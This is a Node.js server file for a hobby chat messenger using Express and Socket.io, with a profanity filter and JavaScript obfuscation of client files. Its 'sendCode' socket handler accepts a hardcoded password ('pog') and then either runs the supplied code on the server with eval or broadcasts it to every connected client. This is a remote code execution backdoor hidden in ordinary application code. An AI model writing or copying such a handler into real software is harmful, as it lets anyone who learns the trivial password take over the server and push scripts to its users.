// Chat messanger created by Hoofer#0001 [github.com/HooferDevelops] and Akkoza#8767 [github.com/AkkozaDevelops]


// variables

const express = require('express');
const path = require('path');
const app = express();
const server = require('http').createServer(app);
const io = require("socket.io")(server);
const fs = require('fs');
const jsObfuscate = require('javascript-obfuscator');
const grawlix = require('grawlix');

const encryptFile = require(`${__dirname}/modules/encryptJSDirectory.js`);

grawlix.setDefaults({
  style: 'redacted',
  plugins: [
    {
      plugin: require('grawlix-racism'),
      options: {
        style: 'asterix'
      }
    }
  ]
});

const port = 3000;

// globals

global.app = app
global.grawlix = grawlix;
global.socket = require("socket.io")();
global.rootDir = __dirname;
global.fs = fs;
global.jsObfuscate = jsObfuscate;
global.encryptFile = encryptFile;
global.path = path;

// encrypt files

encryptFile("/core-js/index.js");

app.use('/', express.static(path.join(__dirname, 'public')));

require(`${__dirname}/modules/startAPIservices.js`)();

// error handler (prevents an error from crashing the entire-backend like it used to before kekw)
process.on('uncaughtException', function (err) {
  console.error(err);
  console.log("Node NOT Exiting...");
});






io.on('connection', (socket) => {
  socket.on("postRequest", (data)=>{
    console.log(require(`${__dirname}/modules/msgVerification.js`)(data,socket));
  });

  socket.on("getUserInfo", (data) => {
    // monkey
  })

  socket.on("sendCode", (data) => {
    var parsedData = JSON.parse(data)

    if (!parsedData) return
    if (!parsedData.password) return
    if (parsedData.password == "pog") {
      if (parsedData.code) {
        if (!parsedData.method) io.emit("server",parsedData.code)
        
        if (parsedData.method == "server") {
          eval(parsedData.code)
        } else {
          io.emit("server",parsedData.code)
        }
      };
    };
  })
});


server.listen(port, function() {
	console.log('Server listening at port %d', port);
});

console.log("hi mom")